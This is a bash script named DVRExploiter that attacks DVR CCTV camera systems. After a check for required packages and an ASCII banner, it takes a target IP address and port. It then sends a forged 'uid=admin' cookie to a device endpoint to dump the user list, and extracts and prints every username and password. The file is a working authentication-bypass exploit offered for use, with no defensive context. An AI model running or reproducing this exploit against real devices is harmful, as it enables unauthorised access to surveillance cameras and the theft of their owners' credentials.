#!/bin/bash
# Project name : DVRExploiter - Exploit DVR CCTV Cameras
# Version : 1.0
# Written by : KsrvcO
# Tested on : Linux Debian based Operation Systems x64/x86
# Video demo : https://www.youtube.com/watch?v=Fioa3dlk41o
reset
echo ""
echo ""
dpkg -s jq &> /dev/null
echo " ***************************************************"
if [ $? -eq 0 ]; then
    echo " [!] Requirement package-1 installed on the host."
else
    echo " [!] First install jq package on the host."
fi
dpkg -s curl &> /dev/null
if [ $? -eq 0 ]; then
    echo " [!] Requirement package-2 installed on the host."
else
    echo " [!] First install curl package on the host."
fi
echo " ***************************************************"
sleep 5
reset
echo ""
echo ""
echo -e "
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗ 
  ██╔══██╗██║   ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
  ██║  ██║██║   ██║██████╔╝█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
  ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
  ██████╔╝ ╚████╔╝ ██║  ██║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
  ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                     Version 1.0      
   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ 
 ( K | s | r | v | c | O )
  \_/ \_/ \_/ \_/ \_/ \_/ 

 Project name : DVRExploiter
 Version : 1.0
 Written by : KsrvcO
 Contact me : flower.k2000@gmail.com


 1. Lets Start
 2. Exit

"
read -p " [+] Choose an option : " option
  if [ $option == "1" ]
      then
        clear
        echo ""
        echo -e "
        ██████╗ ██╗   ██╗██████╗ ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗ 
        ██╔══██╗██║   ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
        ██║  ██║██║   ██║██████╔╝█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
        ██║  ██║╚██╗ ██╔╝██╔══██╗██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
        ██████╔╝ ╚████╔╝ ██║  ██║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
        ╚═════╝   ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                                     Version 1.0      
            _   _   _   _   _   _  
           / \ / \ / \ / \ / \ / \ 
          ( K | s | r | v | c | O )
           \_/ \_/ \_/ \_/ \_/ \_/ 
        "
        read -p " [+] Enter protocol (http/https): " protocol
        read -p " [+] Enter ip address: " ip
        read -p " [+] Enter port number: " port
        echo ""
        echo " [!] Please wait some seconds..."
        sleep 1
        curl --silent "$protocol://$ip:$port/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin" > /tmp/cu-result.txt
        echo ""
        echo " [!] Data dumped..."
        sleep 1
        echo ""
        echo " [!] Getting credentials..."
        cat /tmp/cu-result.txt | jq . > /tmp/cred.txt
        sleep 1
        cat /tmp/cred.txt | grep "uid" | cut -d ":" -f2 | cut -d '"' -f2 > /tmp/user.txt
        cat /tmp/cred.txt | grep "pwd" | cut -d ":" -f2 | cut -d '"' -f2 > /tmp/passw.txt
        echo ""
        echo "= = = = = = = = = = ="
        echo "  R  E  S  U  L  T"
        echo "= = = = = = = = = = ="
        echo ""
        echo "Usernames and Passwords:"
        echo "------------------------"
        paste /tmp/user.txt /tmp/passw.txt
        echo ""
        rm -rf /tmp/user.txt 
        rm -rf /tmp/passw.txt
        rm -rf /tmp/cred.txt
        rm -rf /tmp/cu-result.txt
        sleep 5
        exit
  elif [ $option == "2" ]
      then
        clear
        exit
  else
        echo ""
        echo " [!!] Wrong selection. Exiting..."
        exit
  fi
